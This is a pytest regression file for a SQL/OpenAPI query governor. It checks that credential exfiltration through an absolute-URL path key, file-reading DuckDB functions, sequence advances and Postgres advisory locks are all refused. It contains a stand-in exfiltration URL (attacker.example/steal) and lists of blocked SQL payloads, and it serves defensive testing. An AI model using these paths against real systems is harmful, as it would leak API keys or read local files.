"""Regressions for the seven read-only review findings (an owner-requested review, no task ID).

Each case is the reviewer's own repro, so a failure here means the hole is open again:

1. an OpenAPI ``paths`` key that is an absolute URL must not be fetched (it would carry the
   source's auth secret to an attacker host);
2. a sequence advance must be refused in every spelling (``seq.NEXTVAL``, ``NEXT VALUE FOR``);
3. DuckDB's file readers must be refused like ``pg_read_file``;
4. Postgres advisory locks must be refused (they outlive cancel and rollback);
5. a token value must never reach a startup error message;
6. the governor must not hand a write to an adapter, even a hand-built fragment;
7. a plaintext ``http://`` base URL is refused unless it is loopback.

Nothing here needs a network: the HTTP cases use ``httpx.MockTransport``, which never opens a
socket, so the whole file runs under ``pytest-socket``.
"""

from __future__ import annotations

import json
from collections.abc import Iterator
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, Final, cast

import httpx
import pytest

from mdqm.adapters.base import SourceAdapter
from mdqm.adapters.openapi import GetOnlyTransport, OpenApiAdapter, OpenApiError
from mdqm.config.secrets import EnvSecretProvider
from mdqm.config.settings import AuthSettings, SourceConfig
from mdqm.governor import Governor, GovernorRefusal
from mdqm.models import Fragment, Limits
from mdqm.server.auth import AuthConfigError, StaticTokenVerifier
from mdqm.sql.guard import WRITE_BLOCKED, guard
from mdqm.testing.fake_adapter import FakeAdapter

EXEC_TS: Final = datetime(2026, 1, 1, tzinfo=UTC)

#: The throwaway value the API cases must never leak. It protects nothing; it must stay inside.
SECRET_VALUE: Final = "SECRET-abc-123"
SECRET_REF: Final = "vendor_key"
SECRET_ENV: Final = {"MDQM_SECRET_VENDOR_KEY": SECRET_VALUE}

#: A path key that is an absolute URL. ``httpx`` discards ``base_url`` for one of these, so the
#: request would go to the attacker with the source's ``X-Api-Key`` header attached.
ATTACKER_PATH: Final = "https://attacker.example/steal"


def _row_schema() -> dict[str, Any]:
    return {
        "type": "array",
        "items": {"type": "object", "properties": {"a": {"type": "string"}}},
    }


def _spec(paths: dict[str, Any], *, servers: str = "https://internal.example") -> dict[str, Any]:
    return {
        "openapi": "3.0.0",
        "servers": [{"url": servers}],
        "paths": paths,
    }


def _get_ok() -> dict[str, Any]:
    return {
        "get": {"responses": {"200": {"content": {"application/json": {"schema": _row_schema()}}}}}
    }


class _Recorder:
    """A transport that records every request it is asked to send and answers 200."""

    def __init__(self) -> None:
        self.seen: list[httpx.Request] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.seen.append(request)
        return httpx.Response(200, json=[{"a": "1"}])


def _api_config(**options: Any) -> SourceConfig:
    return SourceConfig(
        name="api",
        adapter="openapi",
        auth=AuthSettings(header="X-Api-Key", secret=SECRET_REF),
        options=options,
    )


# --- FIX 1: an absolute-URL path key --------------------------------------------------------


def test_an_absolute_url_path_key_is_refused_before_any_request() -> None:
    """The reviewer's spec: the attacker host must never receive the source's key."""
    recorder = _Recorder()
    document = _spec({ATTACKER_PATH: _get_ok(), "/ok": _get_ok()})

    with pytest.raises(ValueError) as refused:
        OpenApiAdapter(
            _api_config(),
            EnvSecretProvider(environ=SECRET_ENV),
            spec=document,
            transport=httpx.MockTransport(recorder),
        )

    message = str(refused.value)
    assert ATTACKER_PATH in message, "the refusal must name the offending path key"
    assert "relative path" in message
    assert recorder.seen == [], "zero HTTP requests: the document is refused while it is read"
    assert SECRET_VALUE not in message, "the secret must not appear in the refusal"


def test_the_absolute_url_refusal_carries_an_agent_facing_error() -> None:
    """The refusal is the repo's ``INVALID_SPEC`` shape, with a ``fix`` an agent can act on."""
    with pytest.raises(ValueError) as refused:
        OpenApiAdapter(
            _api_config(),
            EnvSecretProvider(environ=SECRET_ENV),
            spec=_spec({ATTACKER_PATH: _get_ok()}),
            transport=httpx.MockTransport(_Recorder()),
        )

    error = getattr(refused.value, "error", None)
    assert error is not None, "the spec error must carry the ErrorResponse, not only text"
    assert error.code == "INVALID_SPEC"
    assert error.fix.strip()
    assert ATTACKER_PATH in error.problem
    assert SECRET_VALUE not in error.model_dump_json()


@pytest.mark.parametrize(
    "path",
    [
        ATTACKER_PATH,
        "//attacker.example/steal",
        "http://attacker.example/steal",
        "steal",
        "\\steal",
    ],
)
def test_a_path_key_that_is_not_slash_relative_is_refused(path: str) -> None:
    """Everything that is not exactly one leading '/' is refused, not just the absolute form."""
    recorder = _Recorder()
    with pytest.raises(ValueError, match="relative path"):
        OpenApiAdapter(
            _api_config(),
            None,
            spec=_spec({path: _get_ok()}),
            transport=httpx.MockTransport(recorder),
        )
    assert recorder.seen == []


def test_a_relative_path_key_still_works() -> None:
    """The fix must not break the ordinary document: ``/ok`` is a normal path key."""
    recorder = _Recorder()
    adapter = OpenApiAdapter(
        _api_config(),
        None,
        spec=_spec({"/ok": _get_ok()}),
        transport=httpx.MockTransport(recorder),
    )
    assert [table.name for table in adapter.extract_catalog().tables] == ["ok"]


def test_the_transport_refuses_a_request_that_leaves_the_base_host() -> None:
    """Belt and braces, and unskippable: the check lives in the transport, not in ``_get``."""
    inner = _Recorder()
    transport = GetOnlyTransport(httpx.MockTransport(inner), allowed_host="internal.example")

    with pytest.raises(OpenApiError) as refused:
        transport.handle_request(httpx.Request("GET", ATTACKER_PATH))

    assert refused.value.code == "INVALID_SPEC"
    assert inner.seen == [], "the request never reached the wrapped transport"
    assert SECRET_VALUE not in str(refused.value)


def test_the_transport_allows_the_configured_host() -> None:
    """The same check must let the source's own host through, or nothing would ever run."""
    inner = _Recorder()
    transport = GetOnlyTransport(httpx.MockTransport(inner), allowed_host="internal.example")
    response = transport.handle_request(httpx.Request("GET", "https://internal.example/ok"))
    assert response.status_code == 200
    assert len(inner.seen) == 1


def test_the_adapter_wires_its_own_host_into_the_transport() -> None:
    """The adapter must pass its base URL's host, so the transport check is never absent."""
    adapter = OpenApiAdapter(
        _api_config(),
        None,
        spec=_spec({"/ok": _get_ok()}),
        transport=httpx.MockTransport(_Recorder()),
    )
    with pytest.raises(OpenApiError) as refused:
        client = adapter._client  # noqa: SLF001 - the transport under test is the point
        assert client is not None
        client.get(ATTACKER_PATH)
    assert refused.value.code == "INVALID_SPEC"


# --- FIX 2: a sequence advance is a write --------------------------------------------------


@pytest.mark.parametrize(
    ("dialect", "sql"),
    [
        ("oracle", "SELECT seq.nextval FROM dual"),
        ("oracle", 'SELECT "SEQ"."NEXTVAL" FROM dual'),
        ("tsql", "SELECT NEXT VALUE FOR dbo.seq1"),
        ("postgres", "SELECT pg_logical_emit_message(true, 'x', 'y')"),
    ],
    ids=["oracle_nextval", "oracle_quoted_nextval", "tsql_next_value_for", "pg_emit_message"],
)
def test_a_sequence_advance_is_write_blocked(dialect: str, sql: str) -> None:
    """A sequence advance is permanent and survives a rollback: it is a write, not a read."""
    result = guard(sql, dialect)
    assert not result.ok, f"{dialect} allowed a sequence advance: {sql!r}"
    assert result.error is not None
    assert result.error.code == WRITE_BLOCKED
    assert result.ast is None


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT currval('customer_seq') AS id",
        "SELECT pg_current_wal_lsn() AS lsn",
        "SELECT pg_typeof(cust_id) AS t FROM crm.customers",
        "SELECT cust_id FROM crm.customers",
    ],
    ids=["currval", "wal_lsn", "pg_typeof", "plain_select"],
)
def test_reads_next_to_a_sequence_advance_stay_allowed(sql: str) -> None:
    """``currval`` is a read, so the fix must not be a blunt instrument."""
    result = guard(sql, "postgres")
    assert result.ok, f"the fix blocked a read-only statement: {result.error}"


# --- FIX 3: DuckDB file readers -----------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM read_text('/tmp/probe.txt')",
        "SELECT * FROM read_csv_auto('/tmp/probe.csv')",
        "SELECT * FROM read_json_auto('/tmp/probe.json')",
        "SELECT * FROM read_parquet('file:///tmp/probe.parquet')",
        "SELECT * FROM glob('/tmp/*')",
        "SELECT * FROM query('SELECT 1')",
        "SELECT * FROM query_table('/tmp/x.parquet')",
        "SELECT * FROM parquet_scan('/tmp/probe.parquet')",
    ],
)
def test_a_duckdb_file_reader_is_write_blocked(sql: str) -> None:
    """The reviewer's end-to-end repro: the file's contents came back as rows before this."""
    result = guard(sql, "duckdb")
    assert not result.ok, f"duckdb allowed a file reader: {sql!r}"
    assert result.error is not None
    assert result.error.code == WRITE_BLOCKED


def test_an_ordinary_duckdb_table_read_stays_allowed() -> None:
    """The fix must not block a plain read of a real table."""
    result = guard("SELECT a, b FROM some_table WHERE a > 1", "duckdb")
    assert result.ok, f"the fix blocked a table read: {result.error}"


# --- FIX 4: Postgres advisory locks -------------------------------------------------------


@pytest.mark.parametrize(
    "function",
    [
        "pg_advisory_lock",
        "pg_advisory_lock_shared",
        "pg_advisory_unlock",
        "pg_advisory_unlock_shared",
        "pg_advisory_unlock_all",
        "pg_advisory_xact_lock",
        "pg_advisory_xact_lock_shared",
        "pg_try_advisory_lock",
        "pg_try_advisory_lock_shared",
        "pg_try_advisory_xact_lock",
        "pg_try_advisory_xact_lock_shared",
    ],
)
def test_an_advisory_lock_is_write_blocked(function: str) -> None:
    """Session-scoped locks survive cancel and rollback, so a caller could pin a primary."""
    result = guard(f"SELECT {function}(1)", "postgres")
    assert not result.ok, f"postgres allowed an advisory lock: {function}"
    assert result.error is not None
    assert result.error.code == WRITE_BLOCKED


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT currval('s') AS v",
        "SELECT pg_backend_pid() AS pid",
        "SELECT pg_size_pretty(1024) AS pretty",
        "SELECT COUNT(*) AS n FROM crm.customers",
    ],
)
def test_the_advisory_prefix_blocks_no_ordinary_read(sql: str) -> None:
    result = guard(sql, "postgres")
    assert result.ok, f"the advisory prefix blocked a read: {result.error}"


# --- FIX 5: a token value must not reach a startup error ----------------------------------


def test_a_broken_token_file_does_not_echo_the_token(tmp_path: Path) -> None:
    """pydantic renders ``input_value``; for a sibling-field failure that is the whole entry."""
    path = tmp_path / "tokens.json"
    path.write_text(
        json.dumps({"tokens": [{"token": SECRET_VALUE}]}),  # no user_id: the sibling failure
        encoding="utf-8",
    )

    with pytest.raises(AuthConfigError) as refused:
        StaticTokenVerifier.from_file(path)

    message = str(refused.value)
    assert SECRET_VALUE not in message, "the token value must never reach a log line"
    assert "tokens.0.user_id" in message, "the field path is what makes the error actionable"


def test_a_broken_token_file_still_names_the_file_and_the_problem(tmp_path: Path) -> None:
    path = tmp_path / "tokens.json"
    path.write_text(json.dumps({"tokens": [{"token": SECRET_VALUE}]}), encoding="utf-8")
    with pytest.raises(AuthConfigError) as refused:
        StaticTokenVerifier.from_file(path)
    message = str(refused.value)
    assert str(path) in message
    assert "does not match its shape" in message
    assert "Field required" in message


# --- FIX 6: the governor guards the fragment it runs --------------------------------------


class _CallTrail(FakeAdapter):
    """The fake adapter; its own ``calls`` list is the "what did the adapter run" trail."""

    def __init__(self) -> None:
        super().__init__(SourceConfig(name="fake", adapter="fake"))


@pytest.fixture
def trail() -> Iterator[_CallTrail]:
    adapter = _CallTrail()
    try:
        yield adapter
    finally:
        adapter.close()


def _governor(trail: _CallTrail) -> Governor:
    """A governor over the recording fake.

    ``FakeAdapter.kind`` is ``Final``, while the protocol declares ``kind: str`` as writable, so
    pyright cannot match the two even though the conformance kit proves the adapter satisfies the
    protocol at runtime. ``cast`` states that known limitation instead of silencing it globally.
    """
    return Governor({"fake": cast(SourceAdapter, trail)})


def _limits() -> Limits:
    return Limits(timeout_s=5.0, max_rows=10, max_bytes=1_000_000, max_partitions=1)


def test_the_governor_refuses_a_write_fragment(trail: _CallTrail) -> None:
    """The reviewer's repro: the guard said no and the adapter ran it anyway."""
    governor = _governor(trail)
    fragment = Fragment(
        source="fake",
        dialect="duckdb",
        sql="CREATE TABLE evil AS SELECT 1 AS x",
        tables=("evil",),
        exec_ts=EXEC_TS,
    )

    with pytest.raises(GovernorRefusal) as refused:
        governor.execute(source="fake", user="u", fragment=fragment, limits=_limits())

    assert refused.value.code == WRITE_BLOCKED
    assert trail.calls == [], "the adapter must never be asked to run the write"


def test_the_governor_still_runs_a_legitimate_select(trail: _CallTrail) -> None:
    """The new check must not stop an ordinary query."""
    governor = _governor(trail)
    sql = "SELECT * FROM mdqm_fake_probe"  # the one table a bare FakeAdapter holds
    fragment = Fragment(
        source="fake",
        dialect="duckdb",
        sql=sql,
        tables=("mdqm_fake_probe",),
        exec_ts=EXEC_TS,
    )
    outcome = governor.execute(source="fake", user="u", fragment=fragment, limits=_limits())
    assert trail.calls == [sql]
    assert outcome.report.rows == 1


# --- FIX 7: a plaintext base URL ----------------------------------------------------------


def test_a_plaintext_base_url_is_refused() -> None:
    with pytest.raises(ValueError) as refused:
        OpenApiAdapter(
            _api_config(base_url="http://api.internal"),
            None,
            spec=_spec({"/ok": _get_ok()}),
            transport=httpx.MockTransport(_Recorder()),
        )
    message = str(refused.value)
    assert "not https" in message
    assert "http://api.internal" in message
    error = getattr(refused.value, "error", None)
    assert error is not None
    assert error.code == "INVALID_SPEC"
    assert error.fix.strip()


@pytest.mark.parametrize(
    "base_url",
    ["https://api.internal", "http://127.0.0.1:8000", "http://[::1]:8000", "http://localhost:8000"],
)
def test_an_https_or_loopback_base_url_is_allowed(base_url: str) -> None:
    """A sidecar on the same host cannot be eavesdropped, so loopback ``http://`` stays legal."""
    adapter = OpenApiAdapter(
        _api_config(base_url=base_url),
        None,
        spec=_spec({"/ok": _get_ok()}),
        transport=httpx.MockTransport(_Recorder()),
    )
    assert [table.name for table in adapter.extract_catalog().tables] == ["ok"]


def test_a_plaintext_server_url_in_the_spec_is_refused_too() -> None:
    """The override is not the only way in: ``servers[0].url`` is checked the same way."""
    with pytest.raises(ValueError, match="not https"):
        OpenApiAdapter(
            SourceConfig(name="api", adapter="openapi"),
            None,
            spec=_spec({"/ok": _get_ok()}, servers="http://api.internal"),
            transport=httpx.MockTransport(_Recorder()),
        )
